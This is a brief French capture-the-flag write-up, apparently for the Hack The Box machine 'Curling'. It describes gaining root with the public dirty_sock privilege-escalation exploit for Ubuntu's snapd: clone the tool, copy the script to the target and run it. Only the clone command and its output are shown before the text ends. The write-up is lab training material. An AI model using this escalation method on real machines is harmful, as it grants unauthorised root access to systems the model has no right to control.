# Privesc Curling

Bonsoir à tous, j'ai trouvé un moyen d'être root sur la machine Curling avec un moyen très simple et très efficace et rapidement.
Il y'avais une possiblité d'être root grâce au programme dirty_sock, une vulnérabilité très récente sur les machines Ubuntu en général.

Comment faire pour être root sur la machine Curling ? C'est pas très compliqué regardez les explications ;)

Dirty Sock
----

Vous devez simplement installé l'outil dirty_sock avec git, et ensuite de transférer le script sur la machine cible et d'éxecute le script.

    root@Computer:~/htb/writeup/Curling# git clone https://github.com/initstring/dirty_sock.git
    Clonage dans 'dirty_sock'...
    remote: Enumerating objects: 47, done.
    remote: Counting objects: 100% (47/47), done.
    remote: Compressing objects: 100% (19/19), done.
    remote: Total 47 (delta 26), reused 47 (delta 26), pack-reused 0
    Dépaquetage des objets: 100% (47/47), fait.
    Vérification de la connectivité... fait.
